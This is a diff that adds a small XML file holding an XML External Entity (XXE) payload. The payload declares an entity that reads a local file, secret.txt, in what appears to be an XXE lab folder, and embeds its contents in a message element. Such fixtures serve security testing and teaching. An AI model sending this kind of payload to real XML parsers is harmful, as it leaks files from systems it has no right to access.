@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///workspaces/projectx/XXE/secret.txt">
+]>
+<data>
+   <message>&xxe;</message>
+</data>
